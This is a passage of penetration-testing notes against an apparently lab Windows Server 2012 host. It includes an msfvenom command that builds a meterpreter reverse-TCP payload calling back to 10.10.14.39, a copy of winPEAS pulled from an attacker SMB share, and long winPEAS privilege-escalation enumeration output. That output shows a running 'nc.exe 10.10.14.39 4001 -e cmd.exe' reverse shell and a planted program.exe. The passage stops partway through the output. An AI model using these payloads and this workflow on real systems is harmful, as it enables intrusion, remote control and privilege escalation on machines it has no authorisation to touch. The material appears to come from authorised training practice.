using `smb` server that I am hosting to pull `winPEASx64.exe` over
```bash
c:\xampp\tmp>copy \\10.10.14.39\ica\winPEASx64.exe 
copy \\10.10.14.39\ica\winPEASx64.exe 
        1 file(s) copied.

c:\xampp\tmp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DB19-8C12

 Directory of c:\xampp\tmp

05/07/2024  11:09 AM    <DIR>          .
05/07/2024  11:09 AM    <DIR>          ..
03/30/2013  05:29 AM               213 why.tmp
05/07/2024  11:08 AM         2,387,456 winPEASx64.exe
               2 File(s)      2,387,669 bytes
               2 Dir(s)   8,884,547,584 bytes free

```

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.39 lport=4444 -f exe -o program.exe
```


# Winpeas
```bash
C:\xampp\tmp>winPEASx64.exe
winPEASx64.exe
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((   
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.

  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------| 
       |         Get the latest version    :     https://github.com/sponsors/carlospolop |
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


�����������������������������������͹ System Information �������������������������������������

����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    OS Name: Microsoft Windows Server 2012 R2 Standard
    OS Version: 6.3.9600 N/A Build 9600
    System Type: x64-based PC
    Hostname: WEBWIN01-Apollo
    ProductName: Windows Server 2012 R2 Standard
    EditionID: ServerStandard
    ReleaseId: 
    BuildBranch: 
    CurrentMajorVersionNumber: 
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 5/7/2024 12:52:27 PM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: 

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [!] Windows version not supported, build number: '9600'

����������͹ Showing All Microsoft Updates
  [X] Exception: Exception has been thrown by the target of an invocation.

����������͹ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    4/5/2023 3:29:29 AM

����������͹ User Environment Variables
� Check for some passwords or keys in the env variables 
    COMPUTERNAME: WEBWIN01-APOLLO
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\alida\AppData\Local
    PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\ProgramData\chocolatey\bin;C:\tools\php80;C:\tools\BCURRAN3;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 25
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    USERPROFILE: C:\Users\alida
    SystemRoot: C:\Windows
    ChocolateyInstall: C:\ProgramData\chocolatey
    ALLUSERSPROFILE: C:\ProgramData
    FP_NO_HOST_CHECK: NO
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 0101
    USERNAME: alida
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    ComSpec: C:\Windows\system32\cmd.exe
    PROMPT: $P$G
    SystemDrive: C:
    TEMP: C:\Users\alida\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Users\alida\AppData\Roaming
    TMP: C:\Users\alida\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: WEBWIN01-APOLLO
    AP_PARENT_PID: 1904

����������͹ System Environment Variables
� Check for some passwords or keys in the env variables 
    FP_NO_HOST_CHECK: NO
    USERNAME: SYSTEM
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\ProgramData\chocolatey\bin;C:\tools\php80;C:\tools\BCURRAN3;
    ComSpec: C:\Windows\system32\cmd.exe
    TMP: C:\Windows\TEMP
    OS: Windows_NT
    windir: C:\Windows
    PROCESSOR_ARCHITECTURE: AMD64
    TEMP: C:\Windows\TEMP
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 25
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    PROCESSOR_REVISION: 0101
    ChocolateyInstall: C:\ProgramData\chocolatey

����������͹ Audit Settings
� Check what is being logged 
    Not Found

����������͹ Audit Policy Settings - Classic & Advanced

����������͹ WEF Settings
� Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

����������͹ LAPS Settings
� If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

����������͹ Wdigest
� If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

����������͹ LSA Protection
� If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

����������͹ Credentials Guard
� If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled
  [X] Exception:   [X] 'Win32_DeviceGuard' WMI class unavailable

����������͹ Cached Creds
� If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

����������͹ Enumerating saved credentials in Registry (CurrentPass)

����������͹ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

����������͹ Windows Defender configuration
  Local Settings
  Group Policy Settings

����������͹ UAC Status
� If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 0
      [*] LocalAccountTokenFilterPolicy set to 1.
      [+] Any local account can be used for lateral movement.

����������͹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 4.0
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

����������͹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

����������͹ PS default transcripts history
� Read the PS history inside these files (if any)

����������͹ HKCU Internet Settings
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    IE5_UA_Backup_Flag: 5.0
    ZonesSecurityUpgrade: System.Byte[]
    EmailName: User@
    AutoConfigProxy: wininet.dll
    MimeExclusionListForCache: multipart/mixed multipart/x-mixed-replace multipart/x-byteranges 
    WarnOnPost: System.Byte[]
    UseSchannelDirectly: System.Byte[]
    EnableHttp1_1: 1
    UrlEncoding: 0
    SecureProtocols: 2720
    PrivacyAdvanced: 0
    DisableCachingOfSSLPages: 1
    WarnonZoneCrossing: 1
    CertificateRevocation: 1
    EnableNegotiate: 1
    MigrateProxy: 1
    ProxyEnable: 0

����������͹ HKLM Internet Settings
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    WarnOnIntranet: 1
    MinorVersion: 0
    ActiveXCache: C:\Windows\Downloaded Program Files

����������͹ Drives Information
� Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 8 GB)(Permissions: Users [AppendData/CreateDirectories])

����������͹ Checking WSUS
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    Not Found

����������͹ Checking KrbRelayUp
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system isn't inside a domain, so it isn't vulnerable

����������͹ Checking If Inside Container
� If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

����������͹ Enumerate LSA settings - auth packages included

    Bounds                               :       00-30-00-00-00-20-00-00
    auditbasedirectories                 :       0
    fullprivilegeauditing                :       00
    crashonauditfail                     :       0
    auditbaseobjects                     :       0
    Security Packages                    :       ""
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       512
    SecureBoot                           :       1
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

����������͹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

����������͹ Display Local Group Policy settings - local users/machine

����������͹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



����������͹ Enumerating Printers (WMI)
      Name:                    Microsoft XPS Document Writer
      Status:                  Unknown
      Sddl:                    O:SYD:(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)
      Is default:              True
      Is network printer:      False

   =================================================================================================


����������͹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  vgauth-service                                                                                       Everyone [WriteData/CreateFiles]                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


����������͹ Enumerating AMSI registered providers

����������͹ Enumerating Sysmon configuration
      You must be an administrator to run this check

����������͹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

����������͹ Installed .NET versions

  CLR Versions
   4.0.30319

  .NET Versions
   4.8.03761

  .NET & AMSI (Anti-Malware Scan Interface) support
      .NET version supports AMSI     : True
      OS supports AMSI               : False
        [!] The highest .NET version is enrolled in AMSI!


�����������������������������������͹ Interesting Events information �������������������������������������

����������͹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

����������͹ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

����������͹ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

����������͹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.


����������͹ Displaying Power off/on events for last 5 days

  5/6/2024 1:39:19 PM     :  Startup


�����������������������������������͹ Users Information �������������������������������������

����������͹ Users
� Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
  Current user: alida
  Current groups: Domain Users, Everyone, Users, Batch, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
   =================================================================================================

    WEBWIN01-APOLLO\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    WEBWIN01-APOLLO\alida
        |->Groups: Users
        |->Password: NotChange-NotExpi-Req

    WEBWIN01-APOLLO\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq


����������͹ Current User Idle Time
   Current User   :     WEBWIN01-APOLLO\alida
   Idle Time      :     23h:13m:08s:968ms

����������͹ Display Tenant information (DsRegCmd.exe /status)

����������͹ Current Token privileges
� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

����������͹ Clipboard text

����������͹ Logged users
    WEBWIN01-APOLLO\alida

����������͹ Display information about local users
   Computer Name           :   WEBWIN01-APOLLO
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   4/5/2023 3:28:10 AM
   Logons Count            :   42
   Password Last Set       :   3/19/2021 1:52:01 AM

   =================================================================================================

   Computer Name           :   WEBWIN01-APOLLO
   User Name               :   alida
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   5/6/2024 1:39:27 PM
   Logons Count            :   52
   Password Last Set       :   2/18/2021 11:58:10 AM

   =================================================================================================

   Computer Name           :   WEBWIN01-APOLLO
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================


����������͹ RDP Sessions
    Not Found

����������͹ Ever logged users
    WEBWIN01-APOLLO\Administrator
    WEBWIN01-APOLLO\alida

����������͹ Home folders found
    C:\Users\Administrator
    C:\Users\alida : alida [AllAccess]
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Batch [WriteData/CreateFiles]

����������͹ Looking for AutoLogon credentials
    Not Found

����������͹ Password Policies
� Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: WEBWIN01-APOLLO
    SID: S-1-5-21-4111689039-3755366186-3548469937
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================


����������͹ Print Logon Sessions
    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     77766
    Logon Time:                   
    Logon Type:                   0
    Start Time:                   12/31/1600 4:00:00 PM
    Domain:                       WEBWIN01-APOLLO
    Authentication Package:       
    Start Time:                   12/31/1600 4:00:00 PM
    User Name:                    alida
    User Principal Name:          
    User SID:                     

   =================================================================================================



�����������������������������������͹ Processes Information �������������������������������������

����������͹ Interesting Processes -non Microsoft-
� Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes
    powershell(2912)[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: alida
    Command Line: powershell
   =================================================================================================

    cmd(1372)[C:\Windows\SysWOW64\cmd.exe] -- POwn: alida
    Command Line: cmd.exe
   =================================================================================================

    cmd(328)[C:\Windows\SYSTEM32\cmd.exe] -- POwn: alida
    Command Line: C:\Windows\SYSTEM32\cmd.exe /c ""C:\xampp\apache_start.bat""
   =================================================================================================

    conhost(500)[C:\Windows\system32\conhost.exe] -- POwn: alida
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    cmd(84)[C:\Windows\SysWOW64\cmd.exe] -- POwn: alida
    Command Line: cmd.exe /c "nc.exe 10.10.14.39 4001 -e cmd.exe"
   =================================================================================================

    conhost(1508)[C:\Windows\system32\conhost.exe] -- POwn: alida
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    conhost(660)[C:\Windows\system32\conhost.exe] -- POwn: alida
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    httpd(1904)[C:\xampp\apache\bin\httpd.exe] -- POwn: alida
    Permissions: alida [AllAccess]
    Possible DLL Hijacking folder: C:\xampp\apache\bin (alida [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Command Line: apache\bin\httpd.exe
   =================================================================================================

    conhost(776)[C:\Windows\system32\conhost.exe] -- POwn: alida
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    program(1040)[C:\xampp\tmp\program.exe] -- POwn: alida
    Permissions: alida [AllAccess]
    Possible DLL Hijacking folder: C:\xampp\tmp (alida [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Command Line: program.exe
   =================================================================================================

    winPEASx64(1480)[C:\xampp\tmp\winPEASx64.exe] -- POwn: alida -- isDotNet
    Permissions: alida [AllAccess]
    Possible DLL Hijacking folder: C:\xampp\tmp (alida [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Command Line: winPEASx64.exe
   =================================================================================================

    powershell(1980)[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: alida
    Command Line: powershell
   =================================================================================================

    httpd(2272)[C:\xampp\apache\bin\httpd.exe] -- POwn: alida
    Permissions: alida [AllAccess]
    Possible DLL Hijacking folder: C:\xampp\apache\bin (alida [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Command Line: C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache
   =================================================================================================

    nc(1396)[C:\xampp\htdocs\nc.exe] -- POwn: alida
    Permissions: alida [AllAccess]
    Possible DLL Hijacking folder: C:\xampp\htdocs (alida [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Command Line: nc.exe  10.10.14.39 4001 -e cmd.exe
   =================================================================================================

    conhost(724)[C:\Windows\system32\conhost.exe] -- POwn: alida
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    conhost(2136)[C:\Windows\system32\conhost.exe] -- POwn: alida
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    powershell(1964)[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: alida
    Command Line: powershell
   =================================================================================================

    netsh(1248)[C:\Windows\SYSTEM32\netsh.exe] -- POwn: alida
    Command Line: netsh
   =================================================================================================


����������͹ Vulnerable Leaked Handlers
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation
� Getting Leaked Handlers, it might take some time...
                   

�����������������������������������͹ Services Information �������������������������������������
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
  [X] Exception: Access denied 
    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
   =================================================================================================

    @netbvbda.inf,%vbd_srv_desc%;Broadcom NetXtreme II VBD(Broadcom Corporation - @netbvbda.inf,%vbd_srv_desc%;Broadcom NetXtreme II VBD)[System32\drivers\bxvbda.sys] - Boot
   =================================================================================================

    @bxfcoe.inf,%BXFCOE.SVCDESC%;Broadcom NetXtreme II Offload FCoE Driver(Broadcom Corporation - @bxfcoe.inf,%BXFCOE.SVCDESC%;Broadcom NetXtreme II Offload FCoE Driver)[System32\drivers\bxfcoe.sys] - Boot
   =================================================================================================

    @bxois.inf,%BXOIS.SVCDESC%;Broadcom NetXtreme II Offload iSCSI Driver(Broadcom Corporation - @bxois.inf,%BXOIS.SVCDESC%;Broadcom NetXtreme II Offload iSCSI Driver)[System32\drivers\bxois.sys] - Boot
   =================================================================================================

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio T4 Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio T4 Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System
   =================================================================================================

    @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\Windows\system32\DRIVERS\e1i63x64.sys] - System
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;Broadcom NetXtreme II 10 GigE VBD(Broadcom Corporation - @netevbda.inf,%vbd_srv_desc%;Broadcom NetXtreme II 10 GigE VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @iastorav.inf,%iaStorAV.DeviceDesc%;Intel(R) SATA RAID Controller Windows(Intel Corporation - @iastorav.inf,%iaStorAV.DeviceDesc%;Intel(R) SATA RAID Controller Windows)[System32\drivers\iaStorAV.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[System32\drivers\ibbus.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[System32\drivers\mlx4_bus.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[System32\drivers\ndfltr.sys] - Boot
   =================================================================================================

    @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64))[System32\drivers\ql2300i.sys] - Boot
   =================================================================================================

    @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver(QLogic Corporation - @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver)[System32\drivers\ql40xx2i.sys] - Boot
   =================================================================================================

    @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64))[System32\drivers\qlfcoei.sys] - Boot
   =================================================================================================

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - System
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System
   =================================================================================================

    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload
    Alias Manager and Ticket Service
   =================================================================================================

    @oem7.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service(VMware, Inc. - @oem7.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Autoload
    @oem7.inf,%VM3DSERVICE_DESCRIPTION%;Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    @oem12.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem12.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot
   =================================================================================================

    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
    Driver to provide enhanced memory management of this virtual machine.
   =================================================================================================

    @oem6.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem6.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System
   =================================================================================================

    VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================

    @oem10.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(VMware, Inc. - @oem10.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[C:\Windows\system32\DRIVERS\vmxnet3.sys] - System
   =================================================================================================

    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot
    vSockets Driver
   =================================================================================================

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[System32\drivers\winmad.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[System32\drivers\winverbs.sys] - Boot
   =================================================================================================


����������͹ Modifiable Services
� Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    You cannot modify any service

����������͹ Looking if you can modify any service registry
� Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions
    [-] Looks like you cannot change the registry of any service...

����������͹ Checking write permissions in PATH folders (DLL Hijacking)
� Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\ProgramData\chocolatey\bin
